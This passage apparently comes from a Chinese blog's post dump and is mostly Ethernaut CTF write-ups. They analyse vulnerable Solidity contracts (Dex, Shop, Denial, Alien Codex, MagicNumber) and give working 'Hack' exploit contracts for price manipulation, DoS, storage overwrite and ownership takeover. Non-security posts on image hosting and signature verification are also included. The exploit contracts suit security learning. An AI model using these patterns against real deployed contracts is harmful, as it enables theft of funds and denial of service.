swapAmount = getSwapPrice(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123; return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); &#125; function approve(address spender, uint amount) public &#123; SwappableToken(token1).approve(msg.sender, spender, amount); SwappableToken(token2).approve(msg.sender, spender, amount); &#125; function balanceOf(address token, address account) public view returns (uint)&#123; return IERC20(token).balanceOf(account); &#125; &#125; contract SwappableToken is ERC20 &#123; address private _dex; constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123; _mint(msg.sender, initialSupply); _dex = dexInstance; &#125; function approve(address owner, address spender, uint256 amount) public &#123; require(owner != _dex, &quot;InvalidApprover&quot;); super._approve(owner, spender, amount); &#125; &#125; 123456789101112131415161718- ## 2. 分析#### tips： [参考博客](https://stermi.xyz/blog/ethernaut-challenge-21-solution-dex)- 2.1 分析代码可知：这是一个简单的`ERC20`令牌，它向铸造一个`initialSupply`（指定为 的输入）并覆盖了函数以防止地址能够批准任何令牌。- 2.2 分析 Dex.sol 合约可知，它允许`owner`Dex 提供一对代币的流动性`token1`，并且`token2`在最终用户交换这些代币时不收取任何费用。最终用户将使用 Dex 来`swap`（出售）特定数量的一种代币，以取回`swapAmount`（取决于 Dex 的代币价格）另一种代币。- #### `function setTokens(address _token1, address _token2) public onlyOwner` ```solidity function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; 该功能允许Dex平台的所有者设置`token1`和的地址`token2`。该函数正确检查只有`owner`Dex 的 才能调用此函数。`owner`当已经提供这些代币的供应时，防止更改这些地址也是有意义的（否则旧代币将永远卡在合约中）。 #### `function approve(address spender, uint256 amount) public` 1234function approve(address spender, uint256 amount) public &#123; SwappableToken(token1).approve(msg.sender, spender, amount); SwappableToken(token2).approve(msg.sender, spender, amount);&#125; 这是一个更实用的功能，允许最终用户批准`spender`管理`amount`两个令牌中的一个。这里没有什么奇怪的。您可以通过直接调用传递相同参数的`token1`和函数来实现相同的结果，正如我所说的，它只是一个实用函数，可以让最终用户的生活更轻松。`token2` `approve` ### `function balanceOf(address token, address account) public view returns (uint256)` 123function balanceOf(address token, address account) public view returns (uint256) &#123; return IERC20(token).balanceOf(account);&#125; 获取特定代币地址的用户余额的简单实用函数。 ### `function swap(address from, address to, uint256 amount) public` 123456789101112function swap( address from, address to, uint256 amount) public &#123; require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;); require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint256 swapAmount = getSwapPrice(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount);&#125; 这是负责将一个代币与另一个代币交换（出售/购买）的功能。您看到的第一个`require`，检查您是否只能交换`token1`，`token2`反之亦然。 之后，Dex 计算掉期价格。对于给定amount的一个令牌，用户取回了多少其他令牌？ 然后它执行所有需要的传输 amount将出售的代币从用户转移到 Dex 合约 批准Dex管理swapAmount用户购买的代币 swapAmount从 Dex 向用户转移金额 当且仅当两者token1都是代币标准token2的良好实施时，才不需要对这些金额进行检查ERC20。当前的 Dex 正在使用 OpenZeppelin ERC20 实现的两种代币，因此如果 Dex 或用户的余额中没有足够数量的代币来执行转账，交易将自动恢复 function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256)这是整个合约中最核心也是最重要的功能。此功能负责计算掉期价格。执行 的tokenX交换操作时，用户获得多少令牌？tokenY Dex 内部的当前实现是使用代币余额来计算价格，并因此计算用户将收到的代币数量。 为什么这是个问题？使用余额作为计算价格的一个因素将使您的合约热衷于称为“价格操纵”的攻击，不幸的是（但不仅与这个简单的余额案例有关）它并不少见。 用于计算用户因交换操作而收到的代币数量的公式如下((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this))) 这个公式告诉你当你发送代币to时你会得到多少代币。较低的是（与 的余额相比）的余额，较高的是 的金额。amount``from``from``to``to 该 Dex 不使用外部Oracle（如Chainlink）或Uniswap TWAP（时间加权平均价格）来计算掉期价格。相反，它使用令牌的余额来计算它，我们可以利用它。 在 Solidity 中，有一个称为“舍入误差”的已知问题。这个问题是由所有整数除法向下舍入到最接近的整数这一事实引起的。这意味着如果你执行5/2结果将不是2.5but 2。 举个例子，如果我们卖掉 1，token1但token2*amount &lt; token1我们会拿回0 token2！基本上我们会出售代币以获得零回报！ 2.3 参考视频 编写攻击合约 contract Hack &#123; IDex private immutable dex; IERC20 private immutable token1; IERC20 private immutable token2; constructor (IDex _dex) &#123; dex = _dex; token1 = IERC20(dex.token1); token2 = IERC20(dex.token2); &#125; function pwn() external &#123; token1.transferFrom(msg.sender, address(this), 10); token2.transferFrom(msg.sender, address(this), 10); token1.approve(address(dex), type(uint).max); token2.approve(address(dex), type(uint).max); _swap(token1, token2); _swap(token2, token1); _swap(token1, token2); _swap(token2, token1); _swap(token1, token2); dex.swap(address(token2), address(token1), 45); require(token1.balanceOf(address(dex)) == 0, &quot;dex.balance != 0&quot;); &#125; function _swap(IERC20 tokenIn, IERC20 tokenOut) private &#123; dex.swap( address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this))) &#125; &#125; 3. 解题（资金不足）","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Shop","slug":"Smart contracts/ethernaut/Shop","date":"2023-03-08T04:47:10.000Z","updated":"2023-03-08T04:47:10.000Z","comments":true,"path":"2023/03/08/Smart contracts/ethernaut/Shop/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/08/Smart%20contracts/ethernaut/Shop/","excerpt":"","text":"Shop1. 题目要求 1.1 您能在商店以低于要求的价格购买到商品吗？ 可能有帮助的注意点： shop合约预计由买家使用 了解view函数的限制 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Buyer &#123; function price() external view returns (uint); &#125; contract Shop &#123; uint public price = 100; bool public isSold; function buy() public &#123; Buyer _buyer = Buyer(msg.sender); if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123; isSold = true; price = _buyer.price(); &#125; &#125; &#125; 1234567891011121314151617181920212223242526272829## 2. 分析#### tips：[参考博客](https://stermi.xyz/blog/ethernaut-challenge-20-solution-shop)- 2.1 观察代码可知 ，我们有一个`price`内部合同，代表购买该物品必须支付`wei`的金额。`Buyer` **也可以仅在尚未售出的**情况下购买该商品。该属性由函数中`isSold`初始化为`false`然后更改为的状态变量处理。- 2.2 详细查看 buy() 函数，- 这是合约的主要功能。它投射到`msg.sender`并`Buyer`通过这样做它期望交易的发送者是一个实现接口中定义的功能的**合约**。`` 即使在挑战描述中没有明确说明，也应该返回**买家**愿意为购买商店商品支付的`function price() external view returns (uint256);`价格。 合同检查买方的价格（买方愿意支付的价格）是否大于商店的价格，并检查该商品是否尚未售出。如果这个要求通过，它会更新`isSold`到`true`并将`price`的值更新为`_buyer.price();`理论上**应该**与之前一条指令返回的值相同。- 2.3 这里的关键概念是：你**永远不应该** **盲目地相信**你期望**外部参与者**会做什么，即使你定义了一个具有外部参与者应该信任的逻辑的特定接口。 **永远不要盲目相信不在你控制之下的事情。** 因为**我们**是买家，所以我们可以简单的实现`price`这样的功能 ```solidity function price() external view returns (uint256) &#123; return victim.isSold() ? 1 : 1000; &#125; 因为`price`是一个`view`函数，我们不能有一个内部状态变量来改变`uint256`函数返回的值，但我们可以进行标记为`view`或 的外部调用函数`pure`。 2.4 参考视频 写的攻击合约 1234567891011121314151617181920contract Hack &#123; Shop private immutable target; constructor (address _target) &#123; target = Shop(_target); &#125; function pwn() external &#123; target.buy(); require(target.price() == 99, &quot;price != 99&quot;); &#125; function price() external view returns (uint) &#123; if (target.isSold()) &#123; return 99; &#125; return 100; &#125;&#125; 3. 解题（暂时没有以太了，到时候有钱了再来做，生成实例就需要 0.3ether）","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"靶场总结","slug":"Smart contracts/ethernaut/总结","date":"2023-02-23T04:10:10.000Z","updated":"2023-02-23T04:10:10.000Z","comments":true,"path":"2023/02/23/Smart contracts/ethernaut/总结/","link":"","permalink":"https://biyouqiuqiu.com/2023/02/23/Smart%20contracts/ethernaut/%E6%80%BB%E7%BB%93/","excerpt":"","text":"总结题目对我来说还是挺难的，很多题都是做出来但是还没有彻底理解和熟练运用，以后还得多花点时间来消化和吸收 做题的参考有如下： 博客1 博客2 博客3 做题视频 目前进度 20 ，花费ether 大约 2以太","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"总结","slug":"总结","permalink":"https://biyouqiuqiu.com/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"hexo 图床搭建的痛苦历程","slug":"Hexo/hexo 图床搭建的痛苦历程","date":"2023-02-02T16:00:00.000Z","updated":"2023-02-02T16:00:00.000Z","comments":true,"path":"2023/02/03/Hexo/hexo 图床搭建的痛苦历程/","link":"","permalink":"https://biyouqiuqiu.com/2023/02/03/Hexo/hexo%20%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA%E7%9A%84%E7%97%9B%E8%8B%A6%E5%8E%86%E7%A8%8B/","excerpt":"","text":"完善博客图床上传的问题痛苦：本地图片写入博客文档中，在本地可以看见，但是一旦上传到hexo博客上，图片都是无法显示的，都只能通过在线网站，将图片转换成链接的形式，这样真的很麻烦。所以就决定使用图床的方法来进行自动转换。一、使用GitHub作为存储位置tips: 我发现，用GitHub插入图片写博客的话，需要科学上网才行，我不知道为什么，不过问题不大，不能科学上网就使用其他图床就🆗啦1.1 首先得有GitHub的账号，在GitHub上面新建一个专门存储图片的仓储，并获取它的令牌，进去的方式：点击 头像 &#x3D;&#x3D;&gt; setting &#x3D;&#x3D;&gt; Develper settings 1.2 new一个token 1.3 回到 PicGo 上， 分支部分现在都是main 分支，红色部分都为[用户名]&#x2F;[仓库名]，自定义域名哪里的末尾加上@main ，为了方便复制，https://cdn.jsdelivr.net/gh/[用户名]/[仓库名]@main 将上面生成的token粘贴到指定位置就ok了，最后要点击 “设为默认图床”，否则他不会和执行这个图床的，（踩坑亿个小时）1https://cdn.jsdelivr.net/gh/[用户名]/[仓库名]@main 二、使用SM.MS作为存储位置2.1 SM.MS传送门 ，在网站上注册一个账号 2.2 创建令牌 2.3 在PicGo上配置SM.MS图床，在备用上传域名填 smms.app（我的PicGo的版本为2.3.1），将上面生成的token粘贴到指定位置就ok了，最后要点击 “设为默认图床”，否则他不会和执行这个图床的，（踩坑亿个小时） 三、使用vika维格表存储3.1 在vika官网 上注册一个账号 3.2 新建自己的多维空白表格，并获取其id 3.3 获取令牌：点击左下角的头像 &#x3D;&#x3D;&gt;个人设置 3.4 在PicGo上填入相关的 ID 和 token tips: 令牌token只需要一个就行了，vika中可以建多张表，如果需要更换储存位置只需要在PicGo中更换维格表ID就行了最不济的方法就是，使用网站上传，转换网站1https://moe.photo/","categories":[{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/categories/Hexo/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://biyouqiuqiu.com/tags/Hexo/"},{"name":"图床","slug":"图床","permalink":"https://biyouqiuqiu.com/tags/%E5%9B%BE%E5%BA%8A/"},{"name":"sm.ms","slug":"sm-ms","permalink":"https://biyouqiuqiu.com/tags/sm-ms/"},{"name":"vika","slug":"vika","permalink":"https://biyouqiuqiu.com/tags/vika/"}]},{"title":"了解签名认证","slug":"Solidity/Basic_Knowledge/了解签名认证","date":"2023-01-22T08:47:10.000Z","updated":"2023-01-22T08:47:10.000Z","comments":true,"path":"2023/01/22/Solidity/Basic_Knowledge/了解签名认证/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/22/Solidity/Basic_Knowledge/%E4%BA%86%E8%A7%A3%E7%AD%BE%E5%90%8D%E8%AE%A4%E8%AF%81/","excerpt":"","text":"验证签名1. 签名代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// SPDX-License-Identifier: MITpragma solidity ^0.8.4; /* 1. message to sign 2. hash(message) 3. sign(hash(message), private key) | offchain 4. ecrecover(hash(message), signature) == signer */contract VerifySig &#123; // verify 验证签名函数 function verify(address _signer, string memory _message, bytes memory _sig) external pure returns(bool) &#123; bytes32 messageHash = getMessageHash(_message); // 对输入的消息进行 hash运算 bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash); // 对输入消息进行二次hash return recover(ethSignedMessageHash, _sig) == _signer; // 判断公钥的地址是否与_signer 相等? &#125; function getMessageHash(string memory _message) public pure returns(bytes32) &#123; return keccak256(abi.encodePacked(_message)); // 对消息进行hash运算 &#125; function getEthSignedMessageHash(bytes32 _messageHash) public pure returns(bytes32) &#123; //在消息中加入 &quot;\\x19Ethereum Signed Message:\\n32&quot; 字符串,将该字符串和 _messageHash 打包并进行hash运算 return keccak256(abi.encodePacked( &quot;\\x19Ethereum Signed Message:\\n32&quot;, _messageHash)); &#125; function recover(bytes32 _ethSignedMessageHash, bytes memory _sig) public pure returns(address) &#123; (bytes32 r, bytes32 s, uint8 v) = _split(_sig); // 将_sig 分割为 r, s, v三个部分 return ecrecover(_ethSignedMessageHash, v, r, s); &#125; function _split(bytes memory _sig) internal pure returns(bytes32 r, bytes32 s, uint8 v) &#123; require(_sig.length == 65, &quot;invalud signature length&quot;); assembly &#123; // add(_sig, 32) 指跳过32位长度, 去获取_sig 中的一个32位数据 r := mload(add(_sig, 32)) // add(_sig, 64) 指跳过64位长度, 去获取_sig 中的一个32位数据 s := mload(add(_sig, 64)) // add(_sig, 96) 指跳过96位长度, 去获取_sig 中的一个32位数据 // byte(0, mload(add(_sig, 96))) 返回32位中的第一个值 v := byte(0, mload(add(_sig, 96))) &#125; &#125;&#125; 2. 心得参悟：2.1 ecrecover()函数，作用：在solidity中是，将签名的公钥返回。即，假如我使用我的🦊账户给消息进行签名，得到一个签名；在ecrecover() 函数中传入 以太坊签名消息（对消息进行二次 hash运算的结果） ，和签名的组成部分 r , s, v，最终返回的结果为 我🦊钱包的账户地址（公钥） 概括：ecrecover()函数通过传入的”以太坊签名消息” 和 “签名的（r s v）组成部分” 返回公钥（🦊钱包账户地址的前身）2.2 计算以太坊签名消息： 消息可以是能被执行的交易，也可以是其他任何形式。为了避免用户误签了恶意交易，EIP191提倡在消息前加上&quot;\\x19Ethereum Signed Message:\\n32&quot;字符，并再做一次keccak256哈希，作为以太坊签名消息。经过toEthSignedMessageHash()函数处理后的消息，不能被用于执行交易:12345function getEthSignedMessageHash(bytes32 _messageHash) public pure returns(bytes32) &#123; return keccak256(abi.encodePacked( &quot;\\x19Ethereum Signed Message:\\n32&quot;, _messageHash)); //在消息中加入 &quot;\\x19Ethereum Signed Message:\\n32&quot; 字符串,将该字符串和_messageHash 打包并进行hash运算 &#125; 3. 数字签名的相关知识链接","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"}],"tags":[{"name":"验证签名","slug":"验证签名","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ecrecover","slug":"ecrecover","permalink":"https://biyouqiuqiu.com/tags/ecrecover/"}]},{"title":"Denial","slug":"Smart contracts/ethernaut/Denial","date":"2023-01-19T07:10:10.000Z","updated":"2023-01-19T07:10:10.000Z","comments":true,"path":"2023/01/19/Smart contracts/ethernaut/Denial/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/Denial/","excerpt":"","text":"Denial1. 题目要求 1.1 这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。 通关条件： 在owner调用withdraw()时拒绝提取资金（合约仍有资金，并且交易的gas少于1M） 1.2 题目要求 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Denial &#123; address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = address(0xA9E); uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public &#123; partner = _partner; &#125; // withdraw 1% to recipient and 1% to owner function withdraw() public &#123; uint amountToSend = address(this).balance / 100; // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call&#123;value:amountToSend&#125;(&quot;&quot;); payable(owner).transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = block.timestamp; withdrawPartnerBalances[partner] += amountToSend; &#125; // allow deposit of funds receive() external payable &#123;&#125; // convenience function function contractBalance() public view returns (uint) &#123; return address(this).balance; &#125; &#125; 12345678910111213141516171819## 2. 分析#### tips： [参考博客](https://stermi.medium.com/the-ethernaut-challenge-19-solution-denial-e498e19e9b4d)- 2.1这个函数做了什么： - 设置合约的余额`amountToSend` - `partner`通过低级别将余额的 1% 转移到`call` - 将余额的 1% 转入合约的`owner`via`transfer` - `withdraw`更新函数最后一次执行的时间 - 更新合作伙伴提取的金额 正如我们所说，这个挑战完全是关于拒绝服务 (DOS) 的概念，这是一个通用术语，用于描述外部参与者拒绝服务的某个方面的情况。在这种特定情况下，我们要否认`withdraw`合约的过程。 我们该怎么做？`call`我们唯一的选择是在外部对地址做一些坏事`partner`。让我们看看底层`call`在 Solidity 中是如何工作的。 (bool success, bytes memory data) = targetAddress.call&#123;value: &lt;weiSent&gt;, gas: &lt;gasForwarded&gt;&#125;(&lt;calldata&gt;); 1234567891011121314151617181920212223242526272829303132333435363738394041 正如我提到的，这是一个允许您做很多事情的低级函数。通常，它用于： - `value`通过在选项中指定 wei 的数量将 Ether 发送到 EAO - 通过在选项中指定 wei 的数量，将 Ether 发送到已实现`receive`or函数的合约`fallback``value` - 通过将哪个函数和哪些参数传递给目标函数来调用合约函数`&lt;calldata&gt;`。例如，`abi.encodeWithSignature(&quot;callMePlease()&quot;)` 虽然这两个`transfer`高级`send`函数（用于将 ETH 发送到目标地址）都使用**2300 gas**的硬编码量来执行操作，但该`call`函数有两个选项： - 默认情况下，如果您不指定任何内容，它将转发**所有剩余的交易气体** - `gas`否则，您可以指定外部合约可以使用参数的气体量 该`call`函数将返回两个参数： - `bool success`如果调用成功 - `bytes memory data`返回值 每次你执行一个`call`你应该**总是**检查它是否已经成功并恢复（或处理它但是你的场景需要）如果`success`值为假。有关此方面的更多信息，请参阅[SWC-104：未经检查的调用返回值。](https://swcregistry.io/docs/SWC-104) 无论如何，回到我们的场景。我们需要找到一种方法来在`Denial` `withdraw`函数向我们发送`partner`资金时对其进行 DoS。 因为函数没有检查返回值（一般来说，这是一个巨大的错误，请参阅 SWC-104 问题）**即使我们**在调用执行中恢复`withdraw`，函数的流程也会继续。我们如何强制停止执行？ 我们唯一的选择是**排出所有转发的气体**，并由于“气体不足”异常而使智能合约恢复。 一种简单的方法是使用无限循环对状态变量执行计数器增加- [参考视频](https://www.youtube.com/watch?v=Lx0L_3RuJ8c) 写的攻击合约：- ```solidity contract Hack &#123; constructor(Denial target) &#123; target.setWithdrawPartner(address(this)); &#125; fallback() external payable &#123; assembly &#123; invalid() &#125; &#125; &#125; 3. 解题 3.1 获取关卡实例地址：0xa22A605788d9828cb51eAd6AA5d5549cb40Da5F0 3.2 将实力地址作为参数，用以部署攻击合约 3.3 提交案例 3.4 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Alien Codex","slug":"Smart contracts/ethernaut/Alien Codex","date":"2023-01-19T04:10:10.000Z","updated":"2023-01-19T04:10:10.000Z","comments":true,"path":"2023/01/19/Smart contracts/ethernaut/Alien Codex/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/Alien%20Codex/","excerpt":"","text":"Alien Codex1. 题目要求 1.1 你打开了一个 Alien 合约. 申明所有权来完成这一关. 这可能有帮助 理解Array Storage是怎么回事 理解 ABI specifications 使用一个非常 狗 方法 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.5.0; import &#39;../helpers/Ownable-05.sol&#39;; contract AlienCodex is Ownable &#123; bool public contact; bytes32[] public codex; modifier contacted() &#123; assert(contact); _; &#125; function make_contact() public &#123; contact = true; &#125; function record(bytes32 _content) contacted public &#123; codex.push(_content); &#125; function retract() contacted public &#123; codex.length--; &#125; function revise(uint i, bytes32 _content) contacted public &#123; codex[i] = _content; &#125; &#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445## 2. 分析#### tips: [参考博客](https://dac.ac/blog/ethernaut_solutions/#delegation)- 2.1 在 AlienCodex 合约中，我们可以利用该`retract()`函数导致数组长度出现整数下溢`codex`。这个下溢允许我们通过函数修改合约中的任何状态变量`revise()`。该漏洞可以按如下方式执行： 1. 调用`make_contact()`函数通过`contacted()`修饰符检查，要求`contact`为真。 2. 调用`retract()`函数导致数组`codex`长度整数溢出 3. 通过以下方式找到状态变量的散列，`owner`就好像它是`codex`数组的一部分一样： - 获取数组中第一项的哈希值`codex`（因为它在合约存储中被索引），对应于它在合约存储中的槽位。这可以通过计算第一个*位置*的 Keccak256 哈希值来获得，因此：`keccak256(0x0000000000000000000000000000000000000000000000000000000000000001)`。 - 取由此 ( `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`) 产生的哈希值，并从合约中的最大插槽数量中减去其整数值加一 (2个256−1个), 大概是这样的： - ![image-20230225150415772](https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306020020955.png)d.使用这个结果值作为`revise()`要修改的`i`数组的（索引)和我们的地址。`codex``_content`- 2.2 [参考视频](https://www.youtube.com/watch?v=2onc3F6Lbg0) 写的攻击合约- ```solidity interface IAlienCodex &#123; function owner() external view returns (address); function make_contact() external; function revise(uint i, bytes32 _content) external; function retract() external; &#125; contract Hack &#123; constructor(IAlienCodex target) &#123; target.make_contact(); target.retract(); uint256 h = uint256(keccak256(abi.encode(uint256(1)))); uint256 i = uint256(0) - h; // unchecked &#123; // i = i - h; // &#125; target.revise(i, bytes32(uint256(uint160(msg.sender)))); require(target.owner() == msg.sender, &quot;Hack Failed&quot;); &#125; &#125; 3. 解题 3.1 获取关卡实例地址：0x175A96bA1755F20E85ff80089ec9000dD0df463e 3.2 将实例地址作为参数进行对攻击合约的部署 3.3 提交案例 3.4 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"MagicNumber","slug":"Smart contracts/ethernaut/MagicNumber","date":"2023-01-19T01:10:10.000Z","updated":"2023-01-19T01:10:10.000Z","comments":true,"path":"2023/01/19/Smart contracts/ethernaut/MagicNumber/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/19/Smart%20contracts/ethernaut/MagicNumber/","excerpt":"","text":"MagicNumber1. 题目要求 1.1 To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number. Easy right? Well… there’s a catch. The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most. Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode. Good luck 1.2 译：要解决这个关卡，你只需要向 Ethernaut 提供一个，一个用正确的数字Solver响应的合约。whatIsTheMeaningOfLife() 简单吧？嗯…有一个问题。 求解器的代码需要非常小。真的很小。就像 freakin’ really really itty-bitty tiny：最多 10 个操作码。 提示：也许是时候暂时离开 Solidity 编译器的舒适环境，并手动构建这个 O_o。没错：原始 EVM 字节码。 祝你好运！ 1.3 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract MagicNum &#123; address public solver; constructor() &#123;&#125; function setSolver(address _solver) public &#123; solver = _solver; &#125; /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ &#125; 123456789101112131415161718192021222324252627282930313233- ## 2. 分析#### tips： [参考博客](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2)- 2.1有一个在调用时`whatIsTheMeaningOfLife`应答`0x000000000000000000000000000000000000000000000000000000000000002a`(bytes32) 的函数。这是十进制的 42 的十六进制转换。2）我们的合约代码必须小于10字节 这些要求似乎无法实现，即使使用原始字节码来定义函数、处理函数选择器等，也将远远超过 10 字节的代码。 但是我们真的需要有那个功能吗？最后，我们必须塑造合约代码才能通过挑战。如果我们的合同，无论它如何执行，**只**返回**42**怎么办？ 这就是诀窍！如果你认为它就像拥有一个 Solidity 智能合约而不是只有一个`fallback`函数，那么无论你尝试低级调用哪个函数，它都将始终且只执行该`fallback`函数。- 2.2 现在我们需要部署我们刚刚在上一节中编写的最小合约。当一个智能合约被创建时（via `CREATE`or `CREATE2`opcode），EVM 会执行一次构造函数代码，并且部署的智能合约的代码会被 opcode 返回`RETURN`（这个返回的代码称为运行时代码，它是将要执行的代码当您与智能合约交互时）- [参考视频](https://www.youtube.com/watch?v=gUVS4EcrQQQ) 写的攻击合约：- ```solidity contract Hack &#123; constructor(MagicNum target) &#123; bytes memory bytecode = hex&quot;69602a60005260206000f3600052600a6016f3&quot;; address addr; assembly &#123; addr := create(0, add(bytecode, 0x20), 0x13) &#125; require(addr != address(0)); target.setSolver(addr); &#125; &#125; 3. 解题 3.1 获取关卡实例地址：0x5072f4af6D9B0907833C43b199000347158f685d 3.2 传入实例地址部署攻击合约 3.3 提交实例 3.4 成功！！！！","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Recovery","slug":"Smart contracts/ethernaut/Recovery","date":"2023-01-18T11:10:10.000Z","updated":"2023-01-18T11:10:10.000Z","comments":true,"path":"2023/01/18/Smart contracts/ethernaut/Recovery/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/18/Smart%20contracts/ethernaut/Recovery/","excerpt":"","text":"Recovery1. 题目要求 1.1 合约创建者构建了一个非常简单的代币工厂合约。 任何人都可以轻松创建新代币。 在部署了一个代币合约后，创建者发送了 0.001 以太币以获得更多代币。 后边他们丢失了合约地址。 如果您能从丢失的的合约地址中找回(或移除)，则顺利通过此关。 1.2 题目代码 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Recovery &#123; //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public &#123; new SimpleToken(_name, msg.sender, _initialSupply); &#125; &#125; contract SimpleToken &#123; string public name; mapping (address =&gt; uint) public balances; // constructor constructor(string memory _name, address _creator, uint256 